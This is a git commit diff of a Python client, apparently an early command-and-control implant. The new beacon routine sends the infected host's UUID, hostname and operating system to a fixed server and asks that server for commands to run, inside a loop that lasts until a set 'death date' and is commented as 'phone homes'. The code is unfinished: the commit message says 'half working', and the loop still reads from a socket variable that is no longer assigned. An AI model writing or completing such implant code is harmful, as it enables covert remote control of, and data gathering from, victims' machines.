31adfd7dae628259821b26e8d2e00ceea603eb7a
C0nd4 <conda.contact@gmail.com>
2019-11-21 17:14:12 -0500

    Half working GET

--- client.py
+++ client.py
@@ -30,11 +30,31 @@ def closeSocket(socket):
     print("Closing Socket")
     socket.close()
 
+def beacon(ip, port):
+ #   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ #   s.connect((ip, port))
+    fields = "UUID: " + str(UUID) + "\r\n"
+    fields += "HOSTNAME: " + HOSTNAME + "\r\n"
+    fields += "OS: " + OS + "\r\n"
+    http_get("client/" + str(UUID) + "/commands",fields)
+
+def http_get(uri, params):
+    data = "GET /" + uri + " HTTP/1.1\r\n"
+    data += params
+    print(data)
+   # try:
+    s = connectToServer(SERVER_IP, SERVER_PORT)
+    sendData(s, str(data))
+   # except:
+   #     print("GET FAILED")
+   #     return False
+
 if __name__ == "__main__":
     print("Starting client")
-    while datetime.now() < DEATH_DATE:
-        s = connectToServer(SERVER_IP, SERVER_PORT)
-        sendData(s, "PING")
+    while datetime.now() < DEATH_DATE:## Need to change this to consecutive missed phone homes
+#        s = connectToServer(SERVER_IP, SERVER_PORT)
+#        sendData(s, "PING")
+        beacon(SERVER_IP, SERVER_PORT)
         print("Recieving data")
         data = s.recv(BUFFER_SIZE).decode()
         if data:
